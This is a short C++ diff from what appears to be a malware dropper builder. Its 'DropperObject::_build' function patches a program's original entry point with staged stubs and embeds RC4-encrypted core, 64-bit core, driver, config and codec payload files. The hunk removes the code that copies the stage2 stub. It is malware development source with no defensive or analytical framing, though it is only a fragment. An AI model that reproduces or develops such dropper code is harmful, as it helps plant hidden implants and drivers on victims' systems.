@@ -137,13 +137,6 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	header->stage1.size = _patches[0].size;
 	ptr += _patches[0].size;
 	
-	// copy patched code for stage2 stub
-	memcpy(ptr, _patches[1].buffer.get(), _patches[1].size);
-	header->stage2.offset = ptr - _data.get();
-	header->stage2.VA = _patches[1].VA;
-	header->stage2.size = _patches[1].size;
-	ptr += _patches[1].size;
-	
 	// embed core, driver, config and codec files
 	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
 	ptr = _embedFile(header->rc4key, _files.core64, header->files.names.core64, header->files.core64, ptr);
